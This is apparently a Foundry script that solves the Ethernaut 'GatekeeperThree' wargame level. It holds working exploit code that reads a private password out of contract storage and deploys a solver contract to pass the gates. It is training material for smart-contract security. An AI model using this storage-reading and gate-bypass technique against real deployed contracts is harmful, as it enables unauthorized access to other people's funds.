// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/GatekeeperThree/GatekeeperThree.sol";
import "./GatekeeperThreeSolver.sol";

contract GatekeeperThreeScript is Script {

    address internal attacker;
    address internal deployer;
    GatekeeperThree target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = GatekeeperThree(payable(0x0000000000000000000000000000000000000000)); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new GatekeeperThree();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        console.log("tx.origin : %s", tx.origin);
        console.log("target : %s", address(target));
        console.log("target balance  : %s", address(target).balance);
        console.log("owner : %s", target.owner());
        console.log("entrant : %s", target.entrant());
        address trick = address(target.trick());
        console.log("trick : %s", trick);

        console.log("[Exploit]"); // require run this scritp 2 times, because the foundry can not get the correct password
        vm.startBroadcast(attacker);
        if (trick == address(0))
        {
            console.log("Executing createTrick()...");
            target.createTrick();
            trick = address(target.trick());
            console.log("trick : %s", trick);
        }else {
            console.log("Geting allowance...");
            uint256 password = uint(vm.load(trick, bytes32(uint256(2))));
            console.log("passsword : %s", password);
            console.log("verify password : %s", target.trick().checkPassword(password));
            target.getAllowance(password);
            
            console.log("Deploying solver...");
            GatekeeperThreeSolver gts = new GatekeeperThreeSolver(payable(target));
            console.log("solver: %s", address(gts));

            console.log("Executing exploit()...");
            gts.exploit{value: 0.001 ether + 1}();
            console.log("entrant : %s", target.entrant());
        }
         vm.stopBroadcast();
    }
}